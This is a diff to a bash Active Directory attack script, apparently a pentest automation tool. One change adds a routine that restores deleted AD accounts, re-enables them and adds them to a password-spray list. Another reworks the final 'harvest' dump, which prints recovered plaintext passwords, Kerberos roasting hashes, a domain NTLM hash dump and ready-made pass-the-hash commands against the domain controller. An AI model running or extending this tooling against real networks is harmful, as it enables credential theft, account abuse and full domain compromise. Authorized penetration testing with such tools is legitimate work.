@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.4.0"
+readonly VERSION="1.4.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -60,6 +60,7 @@ err()   { echo -e "$G_ERR ${C_RED}$1${C_RESET}"; _log "[-] $1"; }
 run()   { echo -e "$G_RUN ${C_DIM}$1${C_RESET}"; _log "[>] $1"; }
 loot()  { echo -e "$G_LOOT ${C_MAGENTA}${C_BOLD}$1${C_RESET}"; _log "[\$] $1"; }
 qst()   { echo -ne "$G_QST ${C_CYAN}$1${C_RESET}"; }
+detail(){ echo -e "$1"; _log "$(echo -e "$1" | _strip)"; }   # print to screen AND log (used by the final harvest dump)
 
 section() {
     echo
@@ -1438,8 +1439,12 @@ phase_recycle_disabled() {
 
     subsection "Deleted objects (AD Recycle Bin)"
     local del
+    # Tombstoned/deleted/recycled objects need BOTH show-recycled (…2064) and
+    # show-deactivated-link (…2065) controls together — passing only one returns
+    # nothing even when you hold restore rights (this is general, not lab-specific).
     del=$(bloodyAD "${ba[@]}" get search --filter '(isDeleted=TRUE)' \
-            --attr sAMAccountName,distinguishedName -c '1.2.840.113556.1.4.2065' 2>&1)
+            --attr sAMAccountName,distinguishedName,lastKnownParent \
+            -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 2>&1)
     if echo "$del" | grep -qiE 'noSuchObject|denied|ERROR|Traceback'; then
         info "Deleted objects not accessible with this identity (need rights / Recycle Bin)"
     elif echo "$del" | grep -qi 'distinguishedName'; then
@@ -1448,16 +1453,23 @@ phase_recycle_disabled() {
         echo "$del" >"$OUTDIR/deleted_objects.txt"
         loot "Deleted objects present — restorable if you hold the rights"
         if [[ "$DO_ABUSE" == "1" ]]; then
-            echo "$del" | grep -oiP 'distinguishedName:\s*\K\S.*' | grep -i 'DEL:' | while read -r dn; do
-                local name; name=$(echo "$dn" | grep -oiP '^CN=\K[^\\]+')
-                confirm "  Restore deleted object '$name'?" || continue
+            # Pair each tombstoned object's DN with its sAMAccountName (restore by
+            # DN, but enable + spray by the *account name*, not the CN).
+            while IFS=$'\t' read -r dn sam; do
+                [[ -z "$dn" ]] && continue
+                local name="${sam:-$(echo "$dn" | grep -oiP '^CN=\K[^\\]+')}"
+                confirm "  Restore deleted account '$name'?" || continue
                 if bloodyAD "${ba[@]}" set restore "$dn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'restored|success'; then
-                    loot "★ Restored '$name' — will re-enable & spray"
+                    loot "★ Restored '$name' — re-enabling & adding to spray pool"
                     rb_record "Restored deleted object $name" "echo 'Manual: re-delete $name if required by client'"
-                    [[ -n "$name" ]] && { echo "$name" >>"$OUTDIR/users_all.txt"
-                        bloodyAD "${ba[@]}" remove uac "$name" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" >/dev/null; }
+                    bloodyAD "${ba[@]}" remove uac "$sam" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" >/dev/null
+                    [[ -n "$sam" ]] && { echo "$sam" >>"$OUTDIR/users_all.txt"; changed=1; }
                 fi
-            done
+            done < <(echo "$del" | awk '
+                /^distinguishedName:/{dn=$0; sub(/^distinguishedName:[ ]*/,"",dn)}
+                /^sAMAccountName:/{sam=$0; sub(/^sAMAccountName:[ ]*/,"",sam)}
+                /^[[:space:]]*$/{ if(dn ~ /DEL:/ && sam!="") print dn"\t"sam; dn="";sam="" }
+                END{ if(dn ~ /DEL:/ && sam!="") print dn"\t"sam }')
         else
             info "  (report-only; --abuse to restore them)"
         fi
@@ -2778,39 +2790,39 @@ final_summary() {
         section "FULL HARVEST · EVERYTHING RECOVERED"
 
         if [[ -s "$OUTDIR/found_passwords.txt" ]]; then
-            echo -e "  ${C_BOLD}${C_GREEN}» Plaintext passwords${C_RESET} ${C_DIM}($(sort -u "$OUTDIR/found_passwords.txt" | grep -c . ) unique)${C_RESET}"
-            sort -u "$OUTDIR/found_passwords.txt" | while IFS= read -r p; do
+            detail "  ${C_BOLD}${C_GREEN}» Plaintext passwords${C_RESET} ${C_DIM}($(sort -u "$OUTDIR/found_passwords.txt" | grep -c . ) unique)${C_RESET}"
+            while IFS= read -r p; do
                 [[ -z "$p" ]] && continue
                 local who; who=$(grep -F ":$p" "$OUTDIR/valid_creds_map.txt" 2>/dev/null | head -1 | awk '{print $1}')
-                if [[ -n "$who" ]]; then echo -e "      ${C_GREEN}${C_BOLD}${who%%:*}${C_RESET} ${C_DIM}:${C_RESET} ${C_GREEN}$p${C_RESET}"
-                else echo -e "      ${C_GREEN}$p${C_RESET}"; fi
-            done
+                if [[ -n "$who" ]]; then detail "      ${C_GREEN}${C_BOLD}${who%%:*}${C_RESET} ${C_DIM}:${C_RESET} ${C_GREEN}$p${C_RESET}"
+                else detail "      ${C_GREEN}$p${C_RESET}"; fi
+            done < <(sort -u "$OUTDIR/found_passwords.txt")
         fi
 
         if [[ -s "$OUTDIR/asrep_hashes.txt" ]] && grep -qi krb5asrep "$OUTDIR/asrep_hashes.txt"; then
-            echo -e "  ${C_BOLD}${C_YELLOW}» AS-REP roastable${C_RESET} ${C_DIM}($(grep -c krb5asrep "$OUTDIR/asrep_hashes.txt") — hashcat -m 18200)${C_RESET}"
+            detail "  ${C_BOLD}${C_YELLOW}» AS-REP roastable${C_RESET} ${C_DIM}($(grep -c krb5asrep "$OUTDIR/asrep_hashes.txt") — hashcat -m 18200)${C_RESET}"
             while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$krb5asrep\$[0-9]+\$\K[^@:]+')
-                echo -e "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(grep -i krb5asrep "$OUTDIR/asrep_hashes.txt")
+                detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(grep -i krb5asrep "$OUTDIR/asrep_hashes.txt")
         fi
 
         if [[ -s "$OUTDIR/kerberoast_hashes.txt" ]] && grep -qi krb5tgs "$OUTDIR/kerberoast_hashes.txt"; then
-            echo -e "  ${C_BOLD}${C_YELLOW}» Kerberoastable${C_RESET} ${C_DIM}($(grep -c krb5tgs "$OUTDIR/kerberoast_hashes.txt") — hashcat -m 13100)${C_RESET}"
+            detail "  ${C_BOLD}${C_YELLOW}» Kerberoastable${C_RESET} ${C_DIM}($(grep -c krb5tgs "$OUTDIR/kerberoast_hashes.txt") — hashcat -m 13100)${C_RESET}"
             while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+')
-                echo -e "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(grep -i krb5tgs "$OUTDIR/kerberoast_hashes.txt")
+                detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(grep -i krb5tgs "$OUTDIR/kerberoast_hashes.txt")
         fi
 
         if [[ -n "$dd" ]]; then
-            echo -e "  ${C_BOLD}${C_RED}» DOMAIN NTLM DUMP${C_RESET} ${C_DIM}($(grep -cE ':::' "$dd") accounts — Pass-the-Hash ready)${C_RESET}"
+            detail "  ${C_BOLD}${C_RED}» DOMAIN NTLM DUMP${C_RESET} ${C_DIM}($(grep -cE ':::' "$dd") accounts — Pass-the-Hash ready)${C_RESET}"
             # high-value first (Administrator, krbtgt), then the rest
             while IFS= read -r line; do
                 local u nt lc; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4); lc="${u,,}"
                 case "$lc" in
-                    *administrator|*krbtgt|*'$') echo -e "      ${C_RED}${C_BOLD}${u}${C_RESET} ${C_DIM}:${C_RESET} ${C_RED}${nt}${C_RESET}" ;;
-                    *) echo -e "      ${C_CYAN}${u}${C_RESET} ${C_DIM}:${C_RESET} ${C_MAGENTA}${nt}${C_RESET}" ;;
+                    *administrator|*krbtgt|*'$') detail "      ${C_RED}${C_BOLD}${u}${C_RESET} ${C_DIM}:${C_RESET} ${C_RED}${nt}${C_RESET}" ;;
+                    *) detail "      ${C_CYAN}${u}${C_RESET} ${C_DIM}:${C_RESET} ${C_MAGENTA}${nt}${C_RESET}" ;;
                 esac
             done < <(grep -E ':::' "$dd" | grep -iE '(administrator|krbtgt):' ; grep -E ':::' "$dd" | grep -ivE '(administrator|krbtgt):')
             local ah; ah=$(grep -iE '^[^:]*administrator:' "$dd" | head -1 | cut -d: -f4)
-            [[ -n "$ah" ]] && echo -e "      ${C_BOLD}${C_RED}↳ PtH:${C_RESET} ${C_DIM}impacket-secretsdump -hashes :$ah Administrator@$DC_IP  ·  evil-winrm -i $DC_IP -u Administrator -H $ah${C_RESET}"
+            [[ -n "$ah" ]] && detail "      ${C_BOLD}${C_RED}↳ PtH:${C_RESET} ${C_DIM}impacket-secretsdump -hashes :$ah Administrator@$DC_IP  ·  evil-winrm -i $DC_IP -u Administrator -H $ah${C_RESET}"
         fi
         echo
     fi
